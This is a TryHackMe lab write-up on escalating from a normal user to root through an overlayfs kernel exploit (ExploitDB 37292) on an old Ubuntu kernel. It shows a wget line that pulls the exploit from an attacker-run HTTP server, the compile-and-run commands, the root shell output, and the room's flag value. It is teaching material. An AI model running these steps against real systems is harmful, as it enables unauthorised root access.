# TryHackMe — Linux Kernel Privilege Escalation Writeup
> **Date:** March 2026  
> **Difficulty:** Easy  
> **OS:** Ubuntu Linux  
> **Category:** Kernel Exploitation, Privilege Escalation  

---

## Summary

This room covers privilege escalation via a vulnerable Linux kernel. After gaining initial SSH access as a normal user, we identify the kernel version, find a known CVE, download and compile the exploit, and escalate to root.

---

## Table of Contents
1. [Initial Access](#1-initial-access)
2. [Kernel Enumeration](#2-kernel-enumeration)
3. [Finding the Exploit](#3-finding-the-exploit)
4. [Transferring the Exploit](#4-transferring-the-exploit)
5. [Compiling and Executing](#5-compiling-and-executing)
6. [Finding the Flag](#6-finding-the-flag)

---

## 1. Initial Access

SSH into the target as a normal user:

```bash
ssh karen@<target_ip>
```

---

## 2. Kernel Enumeration

Check the kernel version:

```bash
uname -a
```

### Output
```
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
x86_64 x86_64 x86_64 GNU/Linux
```

### Key Findings
- **Kernel version:** 3.13.0-24-generic
- **OS:** Ubuntu
- **Architecture:** x86_64
- **Date:** 2014 — very old, likely vulnerable

---

## 3. Finding the Exploit

Searched ExploitDB for kernel 3.13.0 exploits:

```
https://www.exploit-db.com/exploits/37292
```

**CVE:** Overlayfs privilege escalation — allows local users to gain root via namespace manipulation.

Downloaded `37292.c` to our local machine.

---

## 4. Transferring the Exploit

### On our machine — start a Python HTTP server
```bash
sudo python3 -m http.server 8080
```

### On the target — download the exploit
```bash
wget http://192.168.134.226:8080/37292.c -O /tmp/37292.c
cd /tmp
```

> **Note:** Download to `/tmp` — it's always writable. Never try to write to `/`.

---

## 5. Compiling and Executing

```bash
# Compile the exploit
gcc 37292.c -o exploit

# Run it
./exploit
```

### Output
```
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
#
```

### Confirm root access
```bash
id
```
```
uid=0(root) gid=0(root) groups=0(root)
```

**Root achieved!**

---

## 6. Finding the Flag

```bash
find / -name flag1.txt 2>/dev/null
```

```
./home/matt/flag1.txt
```

```bash
cat /home/matt/flag1.txt
```

```
THM-28392872729920
```

---

## What I Learned

- How to identify kernel version with `uname -a`
- How to search ExploitDB for kernel CVEs
- How to transfer files to a target using Python HTTP server and wget
- Always download to `/tmp` — it's always writable
- How the overlayfs kernel exploit works
- How to compile C exploits with gcc

---

## Tools Used

| Tool | Purpose |
|------|---------|
| SSH | Initial access |
| uname | Kernel version enumeration |
| ExploitDB | Finding kernel CVE |
| Python HTTP server | Serving exploit to target |
| wget | Downloading exploit on target |
| gcc | Compiling C exploit |